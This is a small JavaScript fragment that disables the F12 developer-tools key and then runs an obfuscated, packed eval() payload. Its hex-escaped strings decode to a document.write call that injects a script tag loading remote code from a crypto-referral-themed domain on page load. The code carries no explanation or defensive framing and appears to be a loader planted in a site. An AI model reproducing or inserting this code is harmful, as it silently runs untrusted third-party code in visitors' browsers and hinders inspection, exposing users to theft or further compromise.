document.onkeydown = function (e) {
var currentKey = 0, k = e || window.event;
currentKey = k.keyCode || k.which || k.charCode;
if (currentKey == 123) {
window.event.cancelBubble = true;
window.event.returnValue = false;
}
}
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('f c="\\b";f 1="s\\h\\5\\k\\i\\p\\0\\t",d="\\o\\n\\q\\u\\6\\r\\3\\4\\5\\j\\l\\m\\2\\2\\v\\E\\7\\6\\7\\3\\0\\9\\4\\0\\8\\0\\4\\4\\6\\D\\9\\3\\a\\C\\0\\H\\3\\a\\G\\2",g="\\F\\y\\x\\8\\2\\w\\b\\B\\h\\5";e=">";1=1+d+g;s=c+1+e;A.z(s);',44,44,'x65|s2|x2f|x63|x72|x69pt|x61|x6e|x66|x2d|x6f|x3c|s1|s3|s5|var|s4|x63r|x79|x20s|x20t|x72c|x3d|x74|x74ex|x70|x2F|x76as||x3D|x6A|x62|x3e|x67i|x2E|write|document|x2fs|x64|x6c|x69|x62g|x6d|x2e'.split('|'),0,{}));
